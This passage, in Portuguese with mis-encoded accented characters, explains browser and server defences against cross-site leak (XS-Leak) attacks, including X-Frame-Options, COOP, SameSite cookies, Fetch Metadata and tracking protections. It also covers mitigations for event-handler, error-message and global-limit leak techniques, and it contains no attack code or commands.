* **Frames**. A principal defesa para **impedir que elementos iframe** carreguem recursos HTML √© o uso de **X-Frame-Options**. Alternativamente, a diretiva **frame-ancestors CSP** pode alcan√ßar um resultado semelhante. Se a incorpora√ß√£o for negada, o m√©todo de inclus√£o n√£o pode detectar uma diferen√ßa nas respostas.
* **Pop-ups**. Para restringir o acesso a `window.opener`, o cabe√ßalho de resposta HTTP **COOP** define tr√™s valores diferentes: unsafe-none (padr√£o), same-origin-allow-popups e same-origin. Esses valores podem ser usados para **isolar as guias de navega√ß√£o e pop-ups** e, portanto, mitigar as t√©cnicas de vazamento baseadas em pop-ups.
* **Solicita√ß√µes JavaScript**. As solicita√ß√µes JavaScript de origem cruzada s√£o frequentemente usadas em ataques XS-Leak, porque um invasor tem controle refinado sobre a solicita√ß√£o emitida. No entanto, como essas solicita√ß√µes n√£o s√£o habilitadas para CORS, elas est√£o sujeitas √†s mesmas restri√ß√µes que as solicita√ß√µes enviadas por elementos HTML, como scripts ou imagens. Assim, o impacto dessa t√©cnica de vazamento tamb√©m pode ser **mitigado por CORP e CORB**.

M√©todos mais gen√©ricos:

* **Metadados de busca**. Esses cabe√ßalhos de solicita√ß√£o permitem que os propriet√°rios do servidor entendam melhor como o navegador do usu√°rio causou uma solicita√ß√£o espec√≠fica. No Chrome, os cabe√ßalhos Sec-Fetch-\* s√£o adicionados automaticamente a cada solicita√ß√£o e fornecem metadados sobre a proveni√™ncia da solicita√ß√£o. Por exemplo, Sec-Fetch-Dest: imagem foi acionado a partir de um elemento de imagem. As aplica√ß√µes da Web podem ent√£o optar por bloquear solicita√ß√µes com base nessas informa√ß√µes.
* **Cookies Same-Site**. O sinalizador Same-Site permite que os sites declarem **se um cookie deve ser restrito ao contexto de mesmo site ou de primeira parte**. Todos os principais navegadores suportam cookies Same-Site. No GC, os cookies sem o atributo agora s√£o Lax por padr√£o. Para XS-Leaks, **os cookies Same-Site limitam drasticamente as possibilidades de ataque de vazamento**. Por outro lado, as t√©cnicas de vazamento que dependem de **`window.open` ainda funcionam com `SameSite=Lax`**. Os sites que usam **outros m√©todos de autentica√ß√£o**, como certificados do lado do cliente e autentica√ß√£o HTTP, **permanecem vulner√°veis**.
* **Desvincula√ß√£o de Identificador de Origem Cruzada (COIU)**. COIU, tamb√©m conhecido como Isolamento de Primeira Parte (FPI), √© um recurso de seguran√ßa opcional que os usu√°rios podem habilitar nas configura√ß√µes avan√ßadas do FF (about:config) e foi inicialmente introduzido no Tor Browser. Em uma vis√£o abstrata, √© um contexto de mesmo site estendido. Ele **vincula v√°rios recursos** (por exemplo, cookies, cache, armazenamentos do lado do cliente) **√† primeira parte** em vez de compartilh√°-los entre todos os sites visitados. Se habilitado, o COIU diminui drasticamente a aplicabilidade do XS-Leaks, pois apenas os m√©todos que usam pop-ups ainda s√£o poss√≠veis para atender ao requisito de primeira parte da pol√≠tica.
* **Prote√ß√µes de Rastreamento**. A Apple implementou um mecanismo de privacidade chamado **Preven√ß√£o de Rastreamento Inteligente (ITP)** no SA que visa combater o rastreamento entre sites limitando as capacidades de cookies e outras APIs da Web. Em vers√µes mais recentes do SA, o ITP bloqueia todos os cookies de terceiros por padr√£o, sem exce√ß√µes \[74]. Esse bloqueio impede todos os vazamentos que n√£o s√£o baseados em pop-ups. O FF adotou uma abordagem semelhante com a Preven√ß√£o de Rastreamento Aprimorada (ETP), mas eles apenas bloqueiam cookies de terceiros espec√≠ficos pertencentes a provedores de rastreamento. No contexto do XS-Leaks, o ETP apenas mitiga as t√©cnicas de vazamento que visam esses dom√≠nios de rastreamento.
* **Extens√µes do Navegador**. Usu√°rios conscientes da seguran√ßa podem usar **extens√µes do navegador para impedir certos m√©todos de inclus√£o**.

### Mitiga√ß√µes de T√©cnicas de Vazamento

* **Manipulador de Eventos**. A **mitiga√ß√£o mais eficaz** nesta t√©cnica de vazamento seria **neg√°-los todos**, mas isso quebraria a maioria das aplica√ß√µes da Web na Internet. Portanto, propomos **reduzir o n√∫mero de informa√ß√µes necess√°rias que podem ser coletadas dentro dos eventos**. Por exemplo, o evento de viola√ß√£o do CSP n√£o deve conter a URL de destino de redirecionamento no campo blockedURI. Esse comportamento √© implementado no FF e em vers√µes mais recentes do GC - apenas o SA permanece vulner√°vel.
* **Mensagens de Erro**. Para mitigar XS-Leaks baseados na t√©cnica de vazamento de mensagens de erro, existem dois requisitos principais. Primeiro, **as mensagens de erro n√£o devem conter informa√ß√µes detalhadas**, semelhantes √†s mensagens do manipulador de eventos. Em segundo lugar, os navegadores devem **minimizar as ocorr√™ncias de mensagens de erro**. XS-Leaks, como Erro SRI, XFO do ContentDocument ou Redirecionamento de Busca, detectam se uma mensagem de erro √© lan√ßada ou n√£o.
* **Limites Globais**. Corrigir as t√©cnicas de vazamento que abusam dos limites globais √© relativamente complexo porque eles dependem de restri√ß√µes f√≠sicas. A recomenda√ß√£o geral √©, portanto, **restringir os limites globais em uma pequena base por site**. Se o limite global for 1, como para a API de Pagamento, o invasor pode tentar silenciosamente ativar a interface do usu√°rio de pagamento da Web a qualquer momento, o que s√≥ ter√° sucesso se a interface do usu√°rio n√£o estiver sendo usada simultaneamente por outra guia. Recomendamos acessar a API de Pagamento apenas quando um evento confi√°vel
